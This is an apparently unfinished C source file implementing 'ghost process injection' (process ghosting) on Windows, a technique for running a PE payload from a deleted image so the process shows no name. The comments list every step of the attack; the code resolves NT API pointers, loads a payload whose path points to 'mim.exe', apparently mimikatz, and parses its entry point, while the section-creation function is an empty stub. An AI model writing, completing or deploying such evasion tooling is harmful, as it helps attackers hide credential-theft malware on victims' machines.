/*
 * Ghost Process Injection, the process executable image is deleted before the process is launched, leading the process to appear without a name when viewed.
 */

/*
 * Ghost Process Injection Steps
 * 1. Fetch PE payload
 * 2. Create an empty file o the disk, this file will later be overwritten with the PE payload.
 * 3. Create a ghost section from the .tmp file.
 *      -> A ghost section is created with NtCreateSection
 * 4. Create a process from the ghost section created by calling the NtCreateProcessEx syscall.
 * 5. Write the process parameters and the PEB manually to create a process.
 * 6. Fetch PE payloadd entry point and execute it via a new thread creation
 */

#include <Windows.h>
#include <userenv.h>
#include <stdio.h>
#include "Structs.h"
#pragma comment(lib, "Userenv.lib")
#pragma warning(disable : 4996)

#define pWinError(szWnApiName)			    printf("[!] >>  %ws Failed With Error: %d \n", szWnApiName, GetLastError());
#define pNtError(szNtApiName, NtErr)		printf("[!] >> %ws Failed With Error: 0x%0.8X \n", szNtApiName, NtErr);
#define DELETE_HANDLE(H)								\
	if (H != NULL && H != INVALID_HANDLE_VALUE){		\
		CloseHandle(H);									\
		H = NULL;										\
	}

typedef struct _NT_API_FP
{
    fnNtOpenFile					pNtOpenFile;
    fnNtSetInformationFile			pNtSetInformationFile;
    fnNtAllocateVirtualMemory		pNtAllocateVirtualMemory;
    fnNtWriteVirtualMemory			pNtWriteVirtualMemory;
    fnNtWriteFile					pNtWriteFile;
    fnNtCreateSection				pNtCreateSection;
    fnRtlCreateProcessParametersEx	pRtlCreateProcessParametersEx;
    fnNtCreateProcessEx				pNtCreateProcessEx;
    fnNtQueryInformationProcess		pNtQueryInformationProcess;
    fnNtCreateThreadEx				pNtCreateThreadEx;
    fnNtReadVirtualMemory			pNtReadVirtualMemory;

} NT_API_FP, * PNT_API_FP;

NT_API_FP	g_NtApi = { 0x00 };

#define Alloc(SIZE)				LocalAlloc(LPTR, (SIZE_T)SIZE)
#define Free(BUFF)				LocalFree((LPVOID)BUFF)
#define ReAlloc(BUFF, SIZE)		LocalReAlloc(BUFF, SIZE,  LMEM_MOVEABLE | LMEM_ZEROINIT)

// Function fetch payload from disk
// Parameter: zsFileName            -> Hold the specified PE payload file
// Parameter: ppFileBuffer          -> Dereference the buffer, effectively assign the buffer address toe output parameter
// Parameter: pdwFilzeSize          -> Holds size of the specified PE payload file in bytes
BOOL ReadPePayload(_In_ LPWSTR szFileName, _Out_ PBYTE* ppFileBuffer, _Out_ DWORD* pdwFileSize) {
    HANDLE		hFile				                    = INVALID_HANDLE_VALUE;
    PBYTE		pTmpReadBuffer		                    = NULL;
    DWORD		dwFileSize, dwNumberOfBytesRead			= (DWORD) 0;

    // Check if parameters are valid
    if (!szFileName || !ppFileBuffer || !pdwFileSize)
        return FALSE;

    // Open the specified PE payload file
    if ((hFile = CreateFileW(szFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
        pWinError(L"CreateFileW");
        return FALSE;
    }

    // Get the filesize (in bytes)
    if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
        pWinError(L"GetFileSize");
        goto _CleanUp;
    }

    // Allocate memory for the specified PE file
    if (!(pTmpReadBuffer = Alloc(dwFileSize))) {
        pWinError(L"LocalAlloc");
        goto _CleanUp;
    }

    // Read the PE file from disk
    if (!ReadFile(hFile, pTmpReadBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
        pWinError(L"ReadFile");
        goto _CleanUp;
    }

    // Assigning values to output parameters
    *ppFileBuffer = pTmpReadBuffer;
    *pdwFileSize = dwFileSize;

    _CleanUp:
    DELETE_HANDLE(hFile);
    if (pTmpReadBuffer && !*ppFileBuffer)
        Free(pTmpReadBuffer);
    return *ppFileBuffer != NULL;
}

// Function: Calculates the address of the entry point of the payload and prepares for execution.
// Parameter: pFileBuffer   -> Pointer to the buffer containing the Portable Executable (PE) payload.
DWORD EntryPointExecute(_In_ PBYTE pFileBuffer) {
    // Retrieve the pointer to the NT headers of the PE file.
    PIMAGE_NT_HEADERS  pImgNtHdrs = (PIMAGE_NT_HEADERS)(pFileBuffer + ((PIMAGE_DOS_HEADER)pFileBuffer)->e_lfanew);

    // Check if the PE file has the correct signature.
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return 0x00; // Return 0x00 if the signature is not valid.

    // Return the address of the entry point of the PE file.
    return pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;
}

// Function: Initializes a UNICODE_STRING structure.
// Parameter: UsStruct      -> Pointer to the UNICODE_STRING structure to be initialized.
// Parameter: Buffer        -> Optional pointer to a wide character string to be copied into the buffer member.
VOID RtlInitUnicodeString(_Out_ PUNICODE_STRING UsStruct, _In_ OPTIONAL PCWSTR Buffer) {

    // If the input string buffer is not null
    if ((UsStruct->Buffer = (PWSTR)Buffer)) {

        // Calculate the length of the string and ensure it fits within the maximum allowed length.
        unsigned int Length = wcslen(Buffer) * sizeof(WCHAR);
        if (Length > 0xfffc) // Limit length to avoid buffer overflow.
            Length = 0xfffc;

        // Set the length and maximum length of the UNICODE_STRING structure.
        UsStruct->Length = Length;
        UsStruct->MaximumLength = UsStruct->Length + sizeof(WCHAR);
    }

        // If the input string buffer is null, set the length and maximum length to zero.
    else UsStruct->Length = UsStruct->MaximumLength = 0;
}

// Function creates ghost section from a tmp file
BOOL CreateGhostSection(_In_ LPWSTR szFileName, _In_ PVOID pFileBuffer, _In_ DWORD dwFileSize, _Out_ HANDLE* phGhostSection) {

}


PBYTE		pFileBuffer						= NULL;
DWORD		dwFileSize						= 0;
#define		PE_Payload			L"C:\\Users\\D3v\\Downloads\\mim.exe"

int main() {
    if (!ReadPePayload(PE_Payload, &pFileBuffer, &dwFileSize))
        return -1;
}